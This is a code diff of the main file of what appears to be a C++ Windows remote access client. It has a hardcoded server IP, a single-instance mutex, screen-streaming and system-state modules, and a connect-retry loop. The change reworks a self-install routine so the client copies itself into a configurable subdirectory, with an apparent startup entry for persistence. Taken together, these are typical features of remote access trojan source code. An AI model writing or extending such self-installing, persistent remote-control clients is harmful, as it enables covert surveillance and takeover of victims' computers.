@@ -18,6 +18,7 @@
 #include "box_message/MessageBoxGUI.h"
 #include "screen/ScreenStreamer.h"
 #include "state/SystemState.h"
+#include "install/Install.h"
 
 
 #define IP "192.168.1.133"
@@ -26,7 +27,7 @@
 
 #define TAG_NAME "Client"
 
-#define MUTEX "1b2f107d-215b-499b-8e94-b0dac486b511"
+#define MUTEX "0a9a2d17-f324-43c0-8a22-ea9c6a955658"
 
 #define TIMING_RETRY 10000
 
@@ -38,24 +39,20 @@
 
 #endif
 
-#define INSTALL "C:\\Program Files (x86)\\Client\\client.exe"
+#define INSTALL_PATH 2
 
-#ifdef INSTALL
+#define SUBDIRECTORY_NAME "Client"
 
-#include "install/Install.h"
+#define SUBDIRECTORY_FILE_NAME "client"
 
-#endif
+#define STARTUP_NAME ""
 
 
 
 int main(int argc,char*argv[]) {
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
-
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
-
-#ifdef INSTALL
-Install::installClient(INSTALL,argv[0]);
-#endif
+        Install::installClient(INSTALL_PATH,argv[0],SUBDIRECTORY_NAME,SUBDIRECTORY_FILE_NAME,STARTUP_NAME);
         bool connectionState = true;
         while (connectionState) {
             std::cout << "trying to connect " << std::endl;
